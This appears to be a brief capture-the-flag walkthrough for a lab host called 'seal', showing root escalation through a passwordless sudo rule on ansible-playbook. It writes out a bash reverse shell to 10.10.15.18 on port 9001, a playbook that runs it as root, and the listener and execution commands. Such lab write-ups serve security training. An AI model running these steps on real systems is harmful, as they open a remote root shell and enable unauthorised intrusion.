# Shellcode

## Luis sudo privileges

```bash
luis@seal:/tmp$ sudo -l
Matching Defaults entries for luis on seal:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User luis may run the following commands on seal:
    (ALL) NOPASSWD: /usr/bin/ansible-playbook *
```


1. Saved into /tmp/pwn/rev.sh

```bash
#!/bin/bash

bash -i >& /dev/tcp/10.10.15.18/9001 0>&1
```

2. Saved into /tmp/run.yml

```yaml
- hosts: localhost
  tasks:
  - name: Get Shell
    command: /tmp/pwn/rev.sh
```

3. Start nc listener

```bash
nc -nvlp 9001
```

4. Execute ansible-playbook

```bash
luis@seal:/tmp$ sudo /usr/bin/ansible-playbook run.yml
``` 